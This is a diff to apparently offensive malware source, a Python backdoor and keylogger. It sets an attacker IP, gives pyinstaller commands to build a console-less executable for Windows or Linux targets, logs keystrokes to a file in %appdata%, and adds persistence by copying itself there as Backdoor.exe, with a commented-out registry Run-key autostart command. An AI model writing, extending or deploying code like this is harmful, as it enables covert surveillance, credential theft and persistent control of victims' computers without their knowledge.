@@ -7,6 +7,8 @@ import requests
 import subprocess
 import base64
 import threading
+import shutil
+import sys
 import pynput.keyboard
 #[!!!!!!!!!!!!!!!] WARNING change it to your own ip host(attacker) and uncomment it
 host_ip = "192.168.2.8" 
@@ -15,6 +17,14 @@ host_ip = "192.168.2.8"
 # target is windows then command : wine /root/.wine/drive_c/Python/Scripts/pyinstaller.exe --onefile --noconsole Backdoor.py 
 # target is linux then command : pyinstaller --onefile --noconsole Backdoor.py 
 keys = ""
+try:
+	location = os.environ["appdata"]+"\\Backdoor.exe"
+	if not os.path.exists(location):
+		shutil.copyfile(sys.executable, location)
+# 	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"',shell=True)
+except:
+	pass
+
 try:
 	path = os.environ["appdata"]+"\\keylogger.txt"
 except :
